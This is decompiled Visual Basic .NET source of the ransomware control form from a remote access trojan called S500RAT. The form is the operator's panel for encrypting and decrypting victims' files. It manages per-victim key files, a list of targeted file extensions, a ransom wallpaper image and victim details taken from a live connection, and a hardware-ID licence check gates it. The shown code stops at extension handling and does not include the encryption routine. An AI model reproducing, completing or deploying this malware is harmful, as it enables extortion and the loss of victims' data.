Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Drawing.Text
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My.Resources
Imports S500RAT.Server
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000027 RID: 39
	<DesignerGenerated()>
	Public Partial Class FormRansomware
		Inherits Form

		' Token: 0x060006EF RID: 1775 RVA: 0x0003A700 File Offset: 0x00038900
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormFileSearcher_Load
			AddHandler MyBase.Resize, AddressOf Me.FormFileSearcher_Resize
			Me.FormSize = False
			Me.IsConnected = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170002CB RID: 715
		' (get) Token: 0x060006F2 RID: 1778 RVA: 0x0003D981 File Offset: 0x0003BB81
		' (set) Token: 0x060006F3 RID: 1779 RVA: 0x0003D98C File Offset: 0x0003BB8C
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170002CC RID: 716
		' (get) Token: 0x060006F4 RID: 1780 RVA: 0x0003D9CF File Offset: 0x0003BBCF
		' (set) Token: 0x060006F5 RID: 1781 RVA: 0x0003D9D9 File Offset: 0x0003BBD9
		Public Overridable Property NameForm As UILabel

		' Token: 0x170002CD RID: 717
		' (get) Token: 0x060006F6 RID: 1782 RVA: 0x0003D9E2 File Offset: 0x0003BBE2
		' (set) Token: 0x060006F7 RID: 1783 RVA: 0x0003D9EC File Offset: 0x0003BBEC
		Public Overridable Property ClientInfo As Label

		' Token: 0x170002CE RID: 718
		' (get) Token: 0x060006F8 RID: 1784 RVA: 0x0003D9F5 File Offset: 0x0003BBF5
		' (set) Token: 0x060006F9 RID: 1785 RVA: 0x0003D9FF File Offset: 0x0003BBFF
		Public Overridable Property State As Label

		' Token: 0x170002CF RID: 719
		' (get) Token: 0x060006FA RID: 1786 RVA: 0x0003DA08 File Offset: 0x0003BC08
		' (set) Token: 0x060006FB RID: 1787 RVA: 0x0003DA14 File Offset: 0x0003BC14
		Friend Overridable Property Crypt As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Crypt
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Crypt_Click
				Dim crypt As Guna2GradientButton = Me._Crypt
				If crypt IsNot Nothing Then
					RemoveHandler crypt.Click, value2
				End If
				Me._Crypt = value
				crypt = Me._Crypt
				If crypt IsNot Nothing Then
					AddHandler crypt.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002D0 RID: 720
		' (get) Token: 0x060006FC RID: 1788 RVA: 0x0003DA57 File Offset: 0x0003BC57
		' (set) Token: 0x060006FD RID: 1789 RVA: 0x0003DA64 File Offset: 0x0003BC64
		Friend Overridable Property Decrypt As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Decrypt
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Decrypt_Click
				Dim decrypt As Guna2GradientButton = Me._Decrypt
				If decrypt IsNot Nothing Then
					RemoveHandler decrypt.Click, value2
				End If
				Me._Decrypt = value
				decrypt = Me._Decrypt
				If decrypt IsNot Nothing Then
					AddHandler decrypt.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002D1 RID: 721
		' (get) Token: 0x060006FE RID: 1790 RVA: 0x0003DAA7 File Offset: 0x0003BCA7
		' (set) Token: 0x060006FF RID: 1791 RVA: 0x0003DAB1 File Offset: 0x0003BCB1
		Friend Overridable Property ImageListLogs As ImageList

		' Token: 0x170002D2 RID: 722
		' (get) Token: 0x06000700 RID: 1792 RVA: 0x0003DABA File Offset: 0x0003BCBA
		' (set) Token: 0x06000701 RID: 1793 RVA: 0x0003DAC4 File Offset: 0x0003BCC4
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x170002D3 RID: 723
		' (get) Token: 0x06000702 RID: 1794 RVA: 0x0003DACD File Offset: 0x0003BCCD
		' (set) Token: 0x06000703 RID: 1795 RVA: 0x0003DAD7 File Offset: 0x0003BCD7
		Friend Overridable Property Encryptionkey As Guna2TextBox

		' Token: 0x170002D4 RID: 724
		' (get) Token: 0x06000704 RID: 1796 RVA: 0x0003DAE0 File Offset: 0x0003BCE0
		' (set) Token: 0x06000705 RID: 1797 RVA: 0x0003DAEA File Offset: 0x0003BCEA
		Friend Overridable Property PictureBox_Background As PictureBox

		' Token: 0x170002D5 RID: 725
		' (get) Token: 0x06000706 RID: 1798 RVA: 0x0003DAF3 File Offset: 0x0003BCF3
		' (set) Token: 0x06000707 RID: 1799 RVA: 0x0003DB00 File Offset: 0x0003BD00
		Friend Overridable Property Chose_Backgroundimage As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Chose_Backgroundimage
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Chose_Backgroundimage_Click
				Dim chose_Backgroundimage As Guna2GradientButton = Me._Chose_Backgroundimage
				If chose_Backgroundimage IsNot Nothing Then
					RemoveHandler chose_Backgroundimage.Click, value2
				End If
				Me._Chose_Backgroundimage = value
				chose_Backgroundimage = Me._Chose_Backgroundimage
				If chose_Backgroundimage IsNot Nothing Then
					AddHandler chose_Backgroundimage.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002D6 RID: 726
		' (get) Token: 0x06000708 RID: 1800 RVA: 0x0003DB43 File Offset: 0x0003BD43
		' (set) Token: 0x06000709 RID: 1801 RVA: 0x0003DB4D File Offset: 0x0003BD4D
		Friend Overridable Property DocumentPath As Guna2HtmlLabel

		' Token: 0x170002D7 RID: 727
		' (get) Token: 0x0600070A RID: 1802 RVA: 0x0003DB56 File Offset: 0x0003BD56
		' (set) Token: 0x0600070B RID: 1803 RVA: 0x0003DB60 File Offset: 0x0003BD60
		Friend Overridable Property Label1 As Label

		' Token: 0x170002D8 RID: 728
		' (get) Token: 0x0600070C RID: 1804 RVA: 0x0003DB69 File Offset: 0x0003BD69
		' (set) Token: 0x0600070D RID: 1805 RVA: 0x0003DB74 File Offset: 0x0003BD74
		Friend Overridable Property EnableTextDocument As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._EnableTextDocument
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.EnableTextDocument_CheckedChanged
				Dim enableTextDocument As Guna2ToggleSwitch = Me._EnableTextDocument
				If enableTextDocument IsNot Nothing Then
					RemoveHandler enableTextDocument.CheckedChanged, value2
				End If
				Me._EnableTextDocument = value
				enableTextDocument = Me._EnableTextDocument
				If enableTextDocument IsNot Nothing Then
					AddHandler enableTextDocument.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170002D9 RID: 729
		' (get) Token: 0x0600070E RID: 1806 RVA: 0x0003DBB7 File Offset: 0x0003BDB7
		' (set) Token: 0x0600070F RID: 1807 RVA: 0x0003DBC4 File Offset: 0x0003BDC4
		Friend Overridable Property Choose_Text As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Choose_Text
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Choose_Text_Click
				Dim choose_Text As Guna2GradientButton = Me._Choose_Text
				If choose_Text IsNot Nothing Then
					RemoveHandler choose_Text.Click, value2
				End If
				Me._Choose_Text = value
				choose_Text = Me._Choose_Text
				If choose_Text IsNot Nothing Then
					AddHandler choose_Text.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002DA RID: 730
		' (get) Token: 0x06000710 RID: 1808 RVA: 0x0003DC07 File Offset: 0x0003BE07
		' (set) Token: 0x06000711 RID: 1809 RVA: 0x0003DC11 File Offset: 0x0003BE11
		Friend Overridable Property Label22 As Label

		' Token: 0x170002DB RID: 731
		' (get) Token: 0x06000712 RID: 1810 RVA: 0x0003DC1A File Offset: 0x0003BE1A
		' (set) Token: 0x06000713 RID: 1811 RVA: 0x0003DC24 File Offset: 0x0003BE24
		Friend Overridable Property EnableBackground As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._EnableBackground
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.EnableBackground_CheckedChanged
				Dim enableBackground As Guna2ToggleSwitch = Me._EnableBackground
				If enableBackground IsNot Nothing Then
					RemoveHandler enableBackground.CheckedChanged, value2
				End If
				Me._EnableBackground = value
				enableBackground = Me._EnableBackground
				If enableBackground IsNot Nothing Then
					AddHandler enableBackground.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170002DC RID: 732
		' (get) Token: 0x06000714 RID: 1812 RVA: 0x0003DC67 File Offset: 0x0003BE67
		' (set) Token: 0x06000715 RID: 1813 RVA: 0x0003DC71 File Offset: 0x0003BE71
		Friend Overridable Property StateFiles As Guna2HtmlLabel

		' Token: 0x170002DD RID: 733
		' (get) Token: 0x06000716 RID: 1814 RVA: 0x0003DC7A File Offset: 0x0003BE7A
		' (set) Token: 0x06000717 RID: 1815 RVA: 0x0003DC84 File Offset: 0x0003BE84
		Friend Overridable Property NumList As Guna2HtmlLabel

		' Token: 0x170002DE RID: 734
		' (get) Token: 0x06000718 RID: 1816 RVA: 0x0003DC8D File Offset: 0x0003BE8D
		' (set) Token: 0x06000719 RID: 1817 RVA: 0x0003DC98 File Offset: 0x0003BE98
		Friend Overridable Property TextBox1 As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1_IconRightClick
				Dim value3 As EventHandler = AddressOf Me.TextBox1_IconLeftClick
				Dim value4 As KeyPressEventHandler = AddressOf Me.TextBox1_KeyPress
				Dim value5 As KeyEventHandler = AddressOf Me.TextBox1_KeyDown
				Dim textBox As Guna2TextBox = Me._TextBox1
				If textBox IsNot Nothing Then
					RemoveHandler textBox.IconRightClick, value2
					RemoveHandler textBox.IconLeftClick, value3
					RemoveHandler textBox.KeyPress, value4
					RemoveHandler textBox.KeyDown, value5
				End If
				Me._TextBox1 = value
				textBox = Me._TextBox1
				If textBox IsNot Nothing Then
					AddHandler textBox.IconRightClick, value2
					AddHandler textBox.IconLeftClick, value3
					AddHandler textBox.KeyPress, value4
					AddHandler textBox.KeyDown, value5
				End If
			End Set
		End Property

		' Token: 0x170002DF RID: 735
		' (get) Token: 0x0600071A RID: 1818 RVA: 0x0003DD38 File Offset: 0x0003BF38
		' (set) Token: 0x0600071B RID: 1819 RVA: 0x0003DD42 File Offset: 0x0003BF42
		Friend Overridable Property label4 As Guna2HtmlLabel

		' Token: 0x170002E0 RID: 736
		' (get) Token: 0x0600071C RID: 1820 RVA: 0x0003DD4B File Offset: 0x0003BF4B
		' (set) Token: 0x0600071D RID: 1821 RVA: 0x0003DD55 File Offset: 0x0003BF55
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170002E1 RID: 737
		' (get) Token: 0x0600071E RID: 1822 RVA: 0x0003DD5E File Offset: 0x0003BF5E
		' (set) Token: 0x0600071F RID: 1823 RVA: 0x0003DD68 File Offset: 0x0003BF68
		Friend Overridable Property FileEncrypError As LinkLabel
			<CompilerGenerated()>
			Get
				Return Me._FileEncrypError
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As LinkLabel)
				Dim value2 As LinkLabelLinkClickedEventHandler = AddressOf Me.FileEncrypError_LinkClicked
				Dim fileEncrypError As LinkLabel = Me._FileEncrypError
				If fileEncrypError IsNot Nothing Then
					RemoveHandler fileEncrypError.LinkClicked, value2
				End If
				Me._FileEncrypError = value
				fileEncrypError = Me._FileEncrypError
				If fileEncrypError IsNot Nothing Then
					AddHandler fileEncrypError.LinkClicked, value2
				End If
			End Set
		End Property

		' Token: 0x170002E2 RID: 738
		' (get) Token: 0x06000720 RID: 1824 RVA: 0x0003DDAB File Offset: 0x0003BFAB
		' (set) Token: 0x06000721 RID: 1825 RVA: 0x0003DDB8 File Offset: 0x0003BFB8
		Friend Overridable Property Timer2 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170002E3 RID: 739
		' (get) Token: 0x06000722 RID: 1826 RVA: 0x0003DDFB File Offset: 0x0003BFFB
		' (set) Token: 0x06000723 RID: 1827 RVA: 0x0003DE05 File Offset: 0x0003C005
		Friend Overridable Property Guna2HtmlLabel1 As Guna2HtmlLabel

		' Token: 0x170002E4 RID: 740
		' (get) Token: 0x06000724 RID: 1828 RVA: 0x0003DE0E File Offset: 0x0003C00E
		' (set) Token: 0x06000725 RID: 1829 RVA: 0x0003DE18 File Offset: 0x0003C018
		Friend Overridable Property GetDriversComboBox As Guna2ComboBox
			<CompilerGenerated()>
			Get
				Return Me._GetDriversComboBox
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ComboBox)
				Dim value2 As EventHandler = AddressOf Me.GetDriversComboBox_SelectedIndexChanged
				Dim getDriversComboBox As Guna2ComboBox = Me._GetDriversComboBox
				If getDriversComboBox IsNot Nothing Then
					RemoveHandler getDriversComboBox.SelectedIndexChanged, value2
				End If
				Me._GetDriversComboBox = value
				getDriversComboBox = Me._GetDriversComboBox
				If getDriversComboBox IsNot Nothing Then
					AddHandler getDriversComboBox.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170002E5 RID: 741
		' (get) Token: 0x06000726 RID: 1830 RVA: 0x0003DE5B File Offset: 0x0003C05B
		' (set) Token: 0x06000727 RID: 1831 RVA: 0x0003DE68 File Offset: 0x0003C068
		Friend Overridable Property KeyComboBox1 As Guna2ComboBox
			<CompilerGenerated()>
			Get
				Return Me._KeyComboBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ComboBox)
				Dim value2 As EventHandler = AddressOf Me.KeyComboBox1_SelectedIndexChanged
				Dim keyComboBox As Guna2ComboBox = Me._KeyComboBox1
				If keyComboBox IsNot Nothing Then
					RemoveHandler keyComboBox.SelectedIndexChanged, value2
				End If
				Me._KeyComboBox1 = value
				keyComboBox = Me._KeyComboBox1
				If keyComboBox IsNot Nothing Then
					AddHandler keyComboBox.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170002E6 RID: 742
		' (get) Token: 0x06000728 RID: 1832 RVA: 0x0003DEAB File Offset: 0x0003C0AB
		' (set) Token: 0x06000729 RID: 1833 RVA: 0x0003DEB5 File Offset: 0x0003C0B5
		Friend Overridable Property NumProg As Guna2HtmlLabel

		' Token: 0x170002E7 RID: 743
		' (get) Token: 0x0600072A RID: 1834 RVA: 0x0003DEBE File Offset: 0x0003C0BE
		' (set) Token: 0x0600072B RID: 1835 RVA: 0x0003DEC8 File Offset: 0x0003C0C8
		Friend Overridable Property Guna2Elipse2 As Guna2Elipse

		' Token: 0x170002E8 RID: 744
		' (get) Token: 0x0600072C RID: 1836 RVA: 0x0003DED1 File Offset: 0x0003C0D1
		' (set) Token: 0x0600072D RID: 1837 RVA: 0x0003DEDB File Offset: 0x0003C0DB
		Friend Overridable Property DataGridViewExtension As Guna2DataGridView

		' Token: 0x170002E9 RID: 745
		' (get) Token: 0x0600072E RID: 1838 RVA: 0x0003DEE4 File Offset: 0x0003C0E4
		' (set) Token: 0x0600072F RID: 1839 RVA: 0x0003DEEE File Offset: 0x0003C0EE
		Friend Overridable Property DataGridViewTextBoxColumn5 As DataGridViewTextBoxColumn

		' Token: 0x170002EA RID: 746
		' (get) Token: 0x06000730 RID: 1840 RVA: 0x0003DEF7 File Offset: 0x0003C0F7
		' (set) Token: 0x06000731 RID: 1841 RVA: 0x0003DF01 File Offset: 0x0003C101
		Friend Overridable Property EncryptLogs As Guna2DataGridView

		' Token: 0x170002EB RID: 747
		' (get) Token: 0x06000732 RID: 1842 RVA: 0x0003DF0A File Offset: 0x0003C10A
		' (set) Token: 0x06000733 RID: 1843 RVA: 0x0003DF14 File Offset: 0x0003C114
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x170002EC RID: 748
		' (get) Token: 0x06000734 RID: 1844 RVA: 0x0003DF1D File Offset: 0x0003C11D
		' (set) Token: 0x06000735 RID: 1845 RVA: 0x0003DF27 File Offset: 0x0003C127
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x170002ED RID: 749
		' (get) Token: 0x06000736 RID: 1846 RVA: 0x0003DF30 File Offset: 0x0003C130
		' (set) Token: 0x06000737 RID: 1847 RVA: 0x0003DF3A File Offset: 0x0003C13A
		Friend Overridable Property Column5 As DataGridViewTextBoxColumn

		' Token: 0x170002EE RID: 750
		' (get) Token: 0x06000738 RID: 1848 RVA: 0x0003DF43 File Offset: 0x0003C143
		' (set) Token: 0x06000739 RID: 1849 RVA: 0x0003DF4D File Offset: 0x0003C14D
		Friend Overridable Property Column6 As DataGridViewTextBoxColumn

		' Token: 0x170002EF RID: 751
		' (get) Token: 0x0600073A RID: 1850 RVA: 0x0003DF56 File Offset: 0x0003C156
		' (set) Token: 0x0600073B RID: 1851 RVA: 0x0003DF60 File Offset: 0x0003C160
		Friend Overridable Property Column7 As DataGridViewTextBoxColumn

		' Token: 0x170002F0 RID: 752
		' (get) Token: 0x0600073C RID: 1852 RVA: 0x0003DF69 File Offset: 0x0003C169
		' (set) Token: 0x0600073D RID: 1853 RVA: 0x0003DF73 File Offset: 0x0003C173
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170002F1 RID: 753
		' (get) Token: 0x0600073E RID: 1854 RVA: 0x0003DF7C File Offset: 0x0003C17C
		' (set) Token: 0x0600073F RID: 1855 RVA: 0x0003DF88 File Offset: 0x0003C188
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002F2 RID: 754
		' (get) Token: 0x06000740 RID: 1856 RVA: 0x0003DFCB File Offset: 0x0003C1CB
		' (set) Token: 0x06000741 RID: 1857 RVA: 0x0003DFD5 File Offset: 0x0003C1D5
		Friend Overridable Property ProgressBar1 As Guna2ProgressBar

		' Token: 0x170002F3 RID: 755
		' (get) Token: 0x06000742 RID: 1858 RVA: 0x0003DFDE File Offset: 0x0003C1DE
		' (set) Token: 0x06000743 RID: 1859 RVA: 0x0003DFE8 File Offset: 0x0003C1E8
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170002F4 RID: 756
		' (get) Token: 0x06000744 RID: 1860 RVA: 0x0003DFF1 File Offset: 0x0003C1F1
		' (set) Token: 0x06000745 RID: 1861 RVA: 0x0003DFFB File Offset: 0x0003C1FB
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170002F5 RID: 757
		' (get) Token: 0x06000746 RID: 1862 RVA: 0x0003E004 File Offset: 0x0003C204
		' (set) Token: 0x06000747 RID: 1863 RVA: 0x0003E00E File Offset: 0x0003C20E
		Public Property Client As Clients

		' Token: 0x170002F6 RID: 758
		' (get) Token: 0x06000748 RID: 1864 RVA: 0x0003E017 File Offset: 0x0003C217
		' (set) Token: 0x06000749 RID: 1865 RVA: 0x0003E021 File Offset: 0x0003C221
		Public Property F As FormS500

		' Token: 0x170002F7 RID: 759
		' (get) Token: 0x0600074A RID: 1866 RVA: 0x0003E02A File Offset: 0x0003C22A
		' (set) Token: 0x0600074B RID: 1867 RVA: 0x0003E034 File Offset: 0x0003C234
		Public Property FullPath As String

		' Token: 0x170002F8 RID: 760
		' (get) Token: 0x0600074C RID: 1868 RVA: 0x0003E03D File Offset: 0x0003C23D
		' (set) Token: 0x0600074D RID: 1869 RVA: 0x0003E047 File Offset: 0x0003C247
		Friend Property ParentClient As Clients

		' Token: 0x0600074E RID: 1870 RVA: 0x0003E050 File Offset: 0x0003C250
		Private Sub FormFileSearcher_Load(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
				If flag Then
					MyBase.Close()
				End If
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)
				If flag2 Then
					Setting.Running = True
				Else
					MyBase.Close()
				End If
				Dim flag3 As Boolean = Not Setting.Running
				If flag3 Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Me.EncryptLogs.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.EncryptLogs.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.EncryptLogs.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.EncryptLogs.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.EncryptLogs.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.EncryptLogs.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.EncryptLogs.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.EncryptLogs.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.EncryptLogs.CellBorderStyle = DataGridViewCellBorderStyle.None
			Me.DataGridViewExtension.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.DataGridViewExtension.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.DataGridViewExtension.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.DataGridViewExtension.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.DataGridViewExtension.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.DataGridViewExtension.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.DataGridViewExtension.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.DataGridViewExtension.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex2 As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Dim text As String = Path.Combine(Application.StartupPath, "Clients", "Ransomware\" + Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2)) + "\"
			Dim flag4 As Boolean = Not Directory.Exists(text)
			If flag4 Then
				Directory.CreateDirectory(text)
				Me.FullPath = text
			Else
				Me.FullPath = text
			End If
			Try
				Dim files As String() = Directory.GetFiles(Me.FullPath.ToString())
				For Each path As String In files
					Dim flag5 As Boolean = ".bin".Contains(Path.GetExtension(path).ToLower())
					If flag5 Then
						Me.KeyComboBox1.Items.Add("Key:" + Path.GetFileName(path).Split(New Char() { "."c })(0))
					End If
				Next
				Dim flag6 As Boolean = Me.KeyComboBox1.Items.Count > 0
				If flag6 Then
					Me.KeyComboBox1.SelectedIndex = 0
				End If
			Catch ex3 As Exception
			End Try
			Try
				Dim memoryStream As MemoryStream = New MemoryStream()
				Dim rns_Crypt As Bitmap = Resources.RNS_Crypt
				Using New MemoryStream()
					rns_Crypt.Save(memoryStream, ImageFormat.Jpeg)
					FormRansomware.EncodingImage = memoryStream.ToArray()
					Me.PictureBox_Background.Image = rns_Crypt
				End Using
			Catch ex4 As Exception
			End Try
			Try
				Dim memoryStream3 As MemoryStream = New MemoryStream()
				Dim rns_Dcrypt As Bitmap = Resources.RNS_Dcrypt
				Using New MemoryStream()
					rns_Dcrypt.Save(memoryStream3, ImageFormat.Jpeg)
					FormRansomware.DecryptImage = memoryStream3.ToArray()
				End Using
			Catch ex5 As Exception
				MessageBox.Show(ex5.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
			Me.ReadExtension()
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x0600074F RID: 1871 RVA: 0x0003E608 File Offset: 0x0003C808
		Public Function ReadKey(Filename As String) As Object
			Dim path As String = Me.FullPath + Filename + ".bin"
			Dim flag As Boolean = File.Exists(path)
			Dim result As Object
			If flag Then
				result = File.ReadAllText(path)
			Else
				result = "Not Found!"
			End If
			Return result
		End Function

		' Token: 0x06000750 RID: 1872 RVA: 0x0003E648 File Offset: 0x0003C848
		Private Sub FormFileSearcher_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000751 RID: 1873 RVA: 0x0003E6DC File Offset: 0x0003C8DC
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Dim isConnected As Boolean = Me.IsConnected
			If isConnected Then
				Try
					Dim flag As Boolean = Not Me.Client.TcpClient.Connected
					If flag Then
						MyBase.Close()
					End If
				Catch ex As Exception
					MyBase.Close()
				End Try
			End If
		End Sub

		' Token: 0x06000752 RID: 1874 RVA: 0x0003E740 File Offset: 0x0003C940
		Private Sub AddExtension()
			Try
				Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, Nothing, False) = 0
				If flag Then
					MessageBox.Show("Please enter Extension", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Dim flag2 As Boolean = Not Me.TextBox1.Text.Contains(".")
					If flag2 Then
						MessageBox.Show("Please enter Extension", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					Else
						Dim flag3 As Boolean = Me.TextBox1.Text.Length <= 1
						If flag3 Then
							MessageBox.Show("Please enter Extension", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
						Else
							Dim flag4 As Boolean = Me.TextBox1.Text.Contains(".Sarmat")
							If flag4 Then
								MessageBox.Show("This extension is reserved and not allowed for use", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
							Else
								Me.DataGridViewExtension.Rows.Add(New Object() { Me.TextBox1.Text })
								Me.TextBox1.Clear()
							End If
						End If
					End If
				End If
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x06000753 RID: 1875 RVA: 0x0003E894 File Offset: 0x0003CA94
		Private Sub TextBox1_IconRightClick(sender As Object, e As EventArgs)
			Me.AddExtension()
		End Sub

